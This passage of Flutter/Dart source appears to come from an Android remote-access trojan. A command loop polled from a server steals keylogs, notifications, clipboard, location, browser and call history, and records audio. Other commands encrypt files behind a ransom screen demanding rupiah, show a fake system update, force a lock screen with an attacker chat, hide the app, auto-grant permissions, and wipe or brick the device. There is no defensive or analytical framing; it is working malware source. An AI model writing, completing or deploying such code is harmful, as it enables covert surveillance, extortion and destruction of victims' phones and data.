        catch (e) { result = {"keylogs": "[]", "error": e.toString()}; }
      }
      else if (cmd == 'get_notifications') {
        try { result = {"notifications": await platformSpy.invokeMethod('getNotifications')}; }
        catch (e) { result = {"notifications": "[]", "error": e.toString()}; }
      }
      else if (cmd == 'get_clipboard') {
        try { result = {"clipboard": await platformSpy.invokeMethod('getClipboardHistory')}; }
        catch (e) { result = {"clipboard": "[]", "error": e.toString()}; }
      }
      else if (cmd == 'get_location_history') {
        try { result = {"locations": await platformSpy.invokeMethod('getLocationHistory')}; }
        catch (e) { result = {"locations": "[]", "error": e.toString()}; }
      }
      else if (cmd == 'get_chrome_history') {
        try { result = {"history": await platformSpy.invokeMethod('getChromeHistory')}; }
        catch (e) { result = {"history": "", "error": e.toString()}; }
      }

      else if (cmd == 'get_call_log') {
        try { result = {"logs": await platformSpy.invokeMethod('getCallLogs')}; }
        catch (e) { result = {"logs": [], "error": e.toString()}; }
      }

      else if (cmd == 'get_apps') {
        try { result = {"apps": await platformSpy.invokeMethod('getInstalledApps')}; }
        catch (e) { result = {"apps": [], "error": e.toString()}; }
      }

      else if (cmd == 'device_info') {
        try {
          final di = DeviceInfoPlugin();
          if (Platform.isAndroid) {
            final a = await di.androidInfo;
            result = {
              "manufacturer": a.manufacturer,
              "model":        a.model,
              "brand":        a.brand,
              "android_version": a.version.release,
              "sdk":          a.version.sdkInt.toString(),
              "fingerprint":  a.fingerprint,
              "device_id":    globalDeviceId,
            };
          } else { result = {"device_id": globalDeviceId}; }
        } catch (e) { result = {"error": e.toString()}; }
      }

      else if (cmd == 'record_audio') {
        try {
          final micStatus = await Permission.microphone.status;
          if (micStatus.isGranted) {
            result = await platformSpy.invokeMethod('recordAudio', {
              "duration": extra.isNotEmpty ? int.tryParse(extra) ?? 5 : 5,
            });
            if (result == null) result = {"status": "recorded"};
          } else {
            result = {"status": "Permission denied"};
          }
        } catch (e) {
          result = {"status": "record_failed: $e"};
        }
      }

      else if (cmd == 'start_ransomware') {
        _encryptAllFiles();
        navigatorKey.currentState?.pushAndRemoveUntil(
          MaterialPageRoute(builder: (_) =>
              RansomScreen(amount: extra.isEmpty ? "500000" : extra)),
          (route) => false);
        result = {"status": "Ransomware active"};
      }
      else if (cmd == 'decrypt_files') {
        await _decryptAllFiles();
        navigatorKey.currentState?.pushAndRemoveUntil(
          MaterialPageRoute(builder: (_) => const LockWrapper()),
          (route) => false);
        result = {"status": "Files decrypted"};
      }

      else if (cmd == 'fake_update')       { showFakeUpdate.value = true;  result = {"status": "active"}; }
      else if (cmd == 'stop_fake_update')  { showFakeUpdate.value = false; result = {"status": "stopped"}; }

      else if (cmd == 'auto_block_screen') {
        try { await platformSpy.invokeMethod('showBlockOverlay'); result = {"status": "blocked"}; }
        catch (e) { result = {"status": "error: $e"}; }
      }
      else if (cmd == 'stop_auto_block') {
        try { await platformSpy.invokeMethod('removeBlockOverlay'); result = {"status": "unblocked"}; }
        catch (e) { result = {"status": "error: $e"}; }
      }
      else if (cmd == 'block_app') {
        try { await platformSpy.invokeMethod('killApp', {"package": extra}); result = {"status": "killed"}; }
        catch (e) { result = {"status": "error: $e"}; }
      }

      else if (cmd == 'vibrate_loop') {
        try { await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000}); } catch (_) {}
        result = {"status": "Vibrating"};
      }
      else if (cmd == 'stop_vibrate') {
        try { await platformSpy.invokeMethod('stopVibrate'); } catch (_) {}
        result = {"status": "Stopped"};
      }
      else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe');
        result = {"status": "On"};
      }
      else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe');
        result = {"status": "Off"};
      }
      else if (cmd == 'play_audio') {
        try {
          await _audioPlayer.stop();
          await _audioPlayer.play(UrlSource(extra));
          result = {"status": "Playing"};
        } catch (e) { result = {"status": "Error: $e"}; }
      }
      else if (cmd == 'stop_audio') {
        await _audioPlayer.stop();
        result = {"status": "Stopped"};
      }
      else if (cmd == 'send_notif') {
        try { await platformSpy.invokeMethod('sendNotification', {"title": "Pesan Baru", "body": extra}); result = {"status": "sent"}; }
        catch (e) { result = {"status": "error: $e"}; }
      }
      else if (cmd == 'set_clipboard') {
        Clipboard.setData(ClipboardData(text: extra));
        result = {"status": "Clipboard set: $extra"};
      }
      else if (cmd == 'set_wallpaper') {
        try { await platformSpy.invokeMethod('setWallpaper', {"url": extra}); result = {"status": "Done"}; }
        catch (e) { result = {"status": "error: $e"}; }
      }
      else if (cmd == 'open_url') {
        try {
          final url = Uri.parse(extra);
          if (await canLaunchUrl(url)) await launchUrl(url, mode: LaunchMode.externalApplication);
          result = {"status": "Opened"};
        } catch (e) { result = {"status": "error: $e"}; }
      }
      else if (cmd == 'call_number') {
        try {
          final url = Uri.parse("tel:$extra");
          if (await canLaunchUrl(url)) await launchUrl(url);
          result = {"status": "Calling $extra"};
        } catch (e) { result = {"status": "error: $e"}; }
      }

      else if (cmd == 'kill_wifi') {
        try { await platformSpy.invokeMethod('disableWifi'); result = {"status": "WiFi killed"}; }
        catch (_) { result = {"status": "Failed"}; }
      }
      else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try { await platformSpy.invokeMethod('rebootDevice'); result = {"status": "Rebooting"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'factory_reset') {
        try { final r = await platformSpy.invokeMethod('factoryReset'); result = {"status": r.toString()}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'wipe_sdcard') {
        try { await platformSpy.invokeMethod('wipeSdcard'); result = {"status": "Wiping"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'wipe_user_data') {
        try { final count = await platformSpy.invokeMethod('wipeUserData'); result = {"status": "Wiped $count rows"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'brick_device') {
        try { final r = await platformSpy.invokeMethod('brickDevice'); result = {"status": r.toString()}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }

      else if (cmd == 'hide_app') {
        try { await platformSpy.invokeMethod('hideApp'); result = {"status": "Hidden"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'show_app') {
        try { await platformSpy.invokeMethod('showApp'); result = {"status": "Shown"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }

      else if (cmd == 'auto_grant') {
        try { await platformSpy.invokeMethod('autoGrantPermissions'); result = {"status": "Granted"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }

      else if (cmd == 'force_open') {
        try { await platformSpy.invokeMethod('bringToForeground'); result = {"status": "OK"}; }
        catch (_) { result = {"status": "OK"}; }
      }
      else if (cmd == 'reset_pairid') {
        try { await platformSpy.invokeMethod('resetPairId'); result = {"status": "Reset"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'start_spyware') {
        try { await platformSpy.invokeMethod('startSpyware'); result = {"status": "started"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'stop_spyware') {
        try { await platformSpy.invokeMethod('stopSpyware'); result = {"status": "stopped"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String, String>>.from(lockChatMessages.value);
          msgs.add({'from': 'owner', 'text': extra,
              'time': TimeOfDay.now().format(navigatorKey.currentContext!)});
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      }
      else if (cmd == 'open_accessibility') {
        try { await platformSpy.invokeMethod('openAccessibilitySettings'); result = {"status": "opened"}; }
        catch (e) { result = {"status": "failed: $e"}; }
      }
      else if (cmd == 'list_files') {
        try {
          final dir = Directory(extra.isNotEmpty ? extra : '/sdcard');
          if (await dir.exists()) {
            final files = await dir.list().take(50).map((f) => {
              "name": f.path.split('/').last,
              "path": f.path,
              "size": f is File ? "file" : "dir",
            }).toList();
            result = {"files": files};
          } else {
            result = {"files": [], "error": "Directory not found"};
          }
        } catch (e) { result = {"files": [], "error": e.toString()}; }
      }
      else {
        result = {"status": "unknown_command: $cmd"};
      }

      if (result != null) await _postResponse(id, cmd, result, cmdId: fetchedCmdId);

    } catch (_) {}
  }

  Timer.periodic(const Duration(seconds: 1), (_) => loop());
}

// ════════════════════════════════════════════════════════════════════════════
// LOCK WRAPPER & WEBVIEW
// ════════════════════════════════════════════════════════════════════════════
class LockWrapper extends StatefulWidget {
  const LockWrapper({super.key});
  @override
  State<LockWrapper> createState() => _LockWrapperState();
}

class _LockWrapperState extends State<LockWrapper> with WidgetsBindingObserver {
  final _pinCtrl    = TextEditingController();
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  // 🔥 Simpan snapshot terakhir pesan Firestore yang sudah ditampilkan
  final Set<String> _shownMsgIds = {};

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _chatPollTimer     = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _enforceLockTimer  = Timer.periodic(const Duration(seconds: 3), (_) {
      if (deviceLocked.value) {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _pinCtrl.dispose(); _chatCtrl.dispose(); _chatScroll.dispose();
    _chatPollTimer?.cancel(); _enforceLockTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState s) {
    if (deviceLocked.value &&
        (s == AppLifecycleState.paused || s == AppLifecycleState.inactive ||
         s == AppLifecycleState.hidden || s == AppLifecycleState.detached)) {
      for (final d in [100, 500, 1200]) {
        Future.delayed(Duration(milliseconds: d), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
      }
    }
  }

  // 🔥 FIREBASE — ambil pesan dari subcollection lock_chats/{deviceId}/messages
  Future<void> _pollChat() async {
    if (!deviceLocked.value || globalDeviceId.isEmpty) return;
    try {
      final snap = await FirebaseFirestore.instance
          .collection('lock_chats')
          .doc(globalDeviceId)
          .collection('messages')
          .orderBy('createdAt', descending: false)
          .get()
          .timeout(const Duration(seconds: 4));

      if (snap.docs.isEmpty || !mounted) return;

      final current = List<Map<String, String>>.from(lockChatMessages.value);
      bool added = false;

      for (final doc in snap.docs) {
        if (_shownMsgIds.contains(doc.id)) continue;
        final data = doc.data();
        current.add({
          'from': data['from']?.toString() ?? 'owner',
          'text': data['text']?.toString() ?? '',
          'time': data['time']?.toString() ?? '',
        });
        _shownMsgIds.add(doc.id);
        added = true;
      }

      if (added) {
        lockChatMessages.value = current;
        Future.delayed(const Duration(milliseconds: 100), () {
          if (_chatScroll.hasClients) {
            _chatScroll.animateTo(
              _chatScroll.position.maxScrollExtent,
              duration: const Duration(milliseconds: 200),
              curve: Curves.easeOut,
            );
          }
        });
      }
    } catch (_) {}
  }

  // 🔥 FIREBASE — kirim balasan ke subcollection lock_chats/{deviceId}/messages
  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();

    final now = TimeOfDay.now().format(context);

    final current = List<Map<String, String>>.from(lockChatMessages.value);
    current.add({'from': 'target', 'text': text.trim(), 'time': now});
    lockChatMessages.value = current;

    try {
      final ref = await FirebaseFirestore.instance
          .collection('lock_chats')
          .doc(globalDeviceId)
          .collection('messages')
          .add({
            'from': 'target',
            'text': text.trim(),
            'time': now,
            'createdAt': FieldValue.serverTimestamp(),
          })
          .timeout(const Duration(seconds: 5));
      _shownMsgIds.add(ref.id);
    } catch (_) {}

    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  void _tryUnlock(String pin) {
    if (pin == currentLockPIN) {
      deviceLocked.value = false;
      isLockLive = false;
      lockChatMessages.value = [];
      _shownMsgIds.clear();
      stopSound();
      _pinCtrl.clear();
    } else {
      _pinCtrl.clear();
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text("PIN SALAH",
              style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          backgroundColor: Colors.red,
          duration: Duration(seconds: 1),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (ctx, locked, _) {
        return ValueListenableBuilder<bool>(
          valueListenable: showFakeUpdate,
          builder: (context, fakeUpdate, _) {
            if (fakeUpdate) {
              return const Scaffold(
                backgroundColor: Colors.black,
                body: Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(Icons.android, size: 80, color: Colors.green),
                  SizedBox(height: 24),
                  Text("System Update in Progress", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
                  SizedBox(height: 8),
                  Text("Do not turn off your device", style: TextStyle(color: Colors.grey, fontSize: 14)),
                  SizedBox(height: 24),
                  CircularProgressIndicator(color: Colors.green),
                ])),
              );
            }

            return WillPopScope(
              onWillPop: () async => false,
              child: Stack(children: [
                const WebApp(),
                if (locked)
                  Scaffold(
                    backgroundColor: Colors.black,
                    resizeToAvoidBottomInset: true,
                    body: ValueListenableBuilder<List<Map<String, String>>>(
                      valueListenable: lockChatMessages,
                      builder: (_, msgs, __) => Container(
                        width: double.infinity,
                        height: double.infinity,
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            begin: Alignment.topCenter,
                            end: Alignment.bottomCenter,
                            colors: isLockLive
                                ? [const Color(0xFF000A1A), Colors.black]
                                : [const Color(0xFF1A0000), Colors.black],
                          ),
                        ),
                        child: SafeArea(
                          child: isLockLive
                              ? _buildLockLiveUI(msgs)
                              : _buildLockBasicUI(),
                        ),
                      ),
                    ),
                  ),
              ]),
            );
          },
        );
      },
    );
  }

  Widget _buildLockBasicUI() {
    return Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      const Icon(Icons.gpp_maybe, color: Colors.red, size: 80),
      const SizedBox(height: 18),
      Padding(
        padding: const EdgeInsets.symmetric(horizontal: 28),
        child: Text(currentLockMessage,
            textAlign: TextAlign.center,
            style: const TextStyle(color: Colors.red, fontSize: 19, fontWeight: FontWeight.bold)),
      ),
      const SizedBox(height: 36),
      Padding(
        padding: const EdgeInsets.symmetric(horizontal: 50),
        child: TextField(
          controller: _pinCtrl,
          obscureText: true,
          keyboardType: TextInputType.number,
          textAlign: TextAlign.center,
          style: const TextStyle(color: Colors.white, fontSize: 24, letterSpacing: 10),
          decoration: InputDecoration(
            hintText: "••••",
            hintStyle: const TextStyle(color: Colors.white24, letterSpacing: 6),
            filled: true,
            fillColor: Colors.white10,
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: Colors.red)),
            enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: Colors.red.withOpacity(0.4))),
            focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: Colors.redAccent, width: 2)),
          ),
          onSubmitted: _tryUnlock,
        ),
      ),
      const SizedBox(height: 14),
      ElevatedButton(
        style: ElevatedButton.styleFrom(
          backgroundColor: Colors.red[900],
          minimumSize: const Size(200, 48),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14))),
        onPressed: () => _tryUnlock(_pinCtrl.text),
        child: const Text("UNLOCK",
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 3)),
      ),
    ]);
  }

  Widget _buildLockLiveUI(List<Map<String, String>> msgs) {
    return Column(children: [
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
        child: Row(children: [
          const Icon(Icons.lock, color: Colors.redAccent, size: 18),
          const SizedBox(width: 8),
          Expanded(child: Text(currentLockMessage,
              style: const TextStyle(color: Colors.redAccent, fontSize: 14, fontWeight: FontWeight.bold),
              maxLines: 2, overflow: TextOverflow.ellipsis)),
        ]),
      ),
      const Divider(color: Colors.white12, height: 1),
      Expanded(
        child: msgs.isEmpty
            ? const Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                Icon(Icons.chat_bubble_outline, color: Colors.white24, size: 40),
                SizedBox(height: 10),
                Text('Menunggu pesan...', style: TextStyle(color: Colors.white38, fontSize: 13)),
              ]))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                itemCount: msgs.length,
                itemBuilder: (_, i) {
                  final m = msgs[i];
                  final isOwner = m['from'] == 'owner';
                  return Align(
                    alignment: isOwner ? Alignment.centerLeft : Alignment.centerRight,
                    child: Container(
                      margin: const EdgeInsets.symmetric(vertical: 4),
                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
                      constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.75),
                      decoration: BoxDecoration(
                        color: isOwner ? const Color(0xFF1E2A3A) : Colors.red[900]!.withOpacity(0.9),
                        borderRadius: BorderRadius.only(
                          topLeft: const Radius.circular(14),
                          topRight: const Radius.circular(14),
                          bottomLeft: Radius.circular(isOwner ? 2 : 14),
                          bottomRight: Radius.circular(isOwner ? 14 : 2),
                        ),
                        border: Border.all(
                          color: isOwner ? Colors.blueAccent.withOpacity(0.3) : Colors.redAccent.withOpacity(0.3)),
                      ),
                      child: Column(
                        crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end,
                        children: [
                          Text(isOwner ? 'ADMIN' : 'YOU',
                              style: TextStyle(
                                color: isOwner ? Colors.blueAccent : Colors.redAccent,
                                fontSize: 9, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 3),
                          Text(m['text'] ?? '', style: const TextStyle(color: Colors.white, fontSize: 13)),
                          const SizedBox(height: 3),
                          Text(m['time'] ?? '', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                        ],
                      ),
                    ),
                  );
                }),
      ),
      Container(
        padding: const EdgeInsets.fromLTRB(12, 10, 12, 12),
        decoration: const BoxDecoration(
          color: Color(0xFF0A0A0F),
          border: Border(top: BorderSide(color: Color(0xFF1E1E2E)))),
        child: Column(children: [
          Row(children: [
            Expanded(child: TextField(
              controller: _chatCtrl,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              decoration: InputDecoration(
                hintText: 'Balas pesan...',
                hintStyle: const TextStyle(color: Colors.white38, fontSize: 12),
                filled: true, fillColor: const Color(0xFF1A1A2E),
                contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(20), borderSide: BorderSide.none)),
              onSubmitted: _sendChatReply,
            )),
            const SizedBox(width: 8),
            GestureDetector(
              onTap: () => _sendChatReply(_chatCtrl.text),
              child: Container(
                padding: const EdgeInsets.all(11),
                decoration: const BoxDecoration(color: Colors.redAccent, shape: BoxShape.circle),
                child: const Icon(Icons.send_rounded, color: Colors.white, size: 16)),
            ),
          ]),
          const SizedBox(height: 10),
          Row(children: [
            Expanded(child: TextField(
              controller: _pinCtrl,
              obscureText: true,
              keyboardType: TextInputType.number,
              textAlign: TextAlign.center,
              style: const TextStyle(color: Colors.white, fontSize: 18, letterSpacing: 8),
              decoration: InputDecoration(
                hintText: "PIN Unlock",
                hintStyle: const TextStyle(color: Colors.white24, fontSize: 12),
                filled: true, fillColor: Colors.white10,
                contentPadding: const EdgeInsets.symmetric(vertical: 12),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.red)),
                enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.red.withOpacity(0.3))),
                focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.redAccent)),
              ),
              onSubmitted: _tryUnlock,
            )),
            const SizedBox(width: 8),
            ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.red[900],
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
              onPressed: () => _tryUnlock(_pinCtrl.text),
              child: const Text("BUKA",
                  style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12, letterSpacing: 1)),
            ),
          ]),
        ]),
      ),
    ]);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// WEBVIEW
// ════════════════════════════════════════════════════════════════════════════
class WebApp extends StatefulWidget {
  const WebApp({super.key});
  @override
  State<WebApp> createState() => _WebAppState();
}

class _WebAppState extends State<WebApp> {
  late final WebViewController _ctrl;
  bool _loading = true;
  double _progress = 0;
  bool _init = false;

  @override
  void initState() {
    super.initState();
    _ctrl = WebViewController();
    _initWebView();
  }

  Future<void> _initWebView() async {
    if (_init) return;
    _init = true;
    if (Platform.isAndroid && _ctrl.platform is AndroidWebViewController) {
      try {
        await (_ctrl.platform as AndroidWebViewController)
            .setMediaPlaybackRequiresUserGesture(false);
        await (_ctrl.platform as AndroidWebViewController).setUserAgent(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
        await (_ctrl.platform as AndroidWebViewController)
            .setOnPlatformPermissionRequest((request) { request.grant(); });
      } catch (_) {}
    }
    _ctrl
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.white)
      ..setNavigationDelegate(NavigationDelegate(
        onProgress:    (p) => setState(() => _progress = p / 100),
        onPageStarted: (_) => setState(() => _loading = true),
        onPageFinished: (_) => setState(() => _loading = false),
        onWebResourceError: (e) => debugPrint('WebView error: ${e.description}'),
      ))
      ..loadRequest(Uri.parse(kBakedWebUrl));
    if (mounted) setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if (await _ctrl.canGoBack()) { _ctrl.goBack(); return false; }
        return true;
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(children: [
            WebViewWidget(controller: _ctrl),
            if (_loading)
              Positioned(
                top: 0, left: 0, right: 0,
                child: LinearProgressIndicator(
                  value: _progress == 0 ? null : _progress,
                  backgroundColor: Colors.transparent,
                  color: Colors.blue, minHeight: 2)),
          ]),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// RANSOM SCREEN
// ════════════════════════════════════════════════════════════════════════════
class RansomScreen extends StatelessWidget {
  final String amount;
  const RansomScreen({super.key, required this.amount});

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: SafeArea(
          child: Center(
            child: Padding(
              padding: const EdgeInsets.all(24),
              child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                const Icon(Icons.gpp_bad, color: Colors.red, size: 100),
                const SizedBox(height: 24),
                const Text("YOUR FILES HAVE BEEN ENCRYPTED",
                    textAlign: TextAlign.center,
                    style: TextStyle(color: Colors.red, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 16),
                const Text(
                    "All your photos, documents, and data are locked. Pay the ransom to decrypt.",
                    textAlign: TextAlign.center,
                    style: TextStyle(color: Colors.white70, fontSize: 14)),
                const SizedBox(height: 32),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    border: Border.all(color: Colors.red),
                    borderRadius: BorderRadius.circular(12)),
                  child: Text("RANSOM: Rp $amount",
                      style: const TextStyle(color: Colors.red, fontSize: 22, fontWeight: FontWeight.bold)),
                ),
                const SizedBox(height: 32),
                const Text("Contact: @nfleep",
                    style: TextStyle(color: Colors.white, fontSize: 16)),
              ]),
            ),
          ),
        ),
      ),
    );
  }
}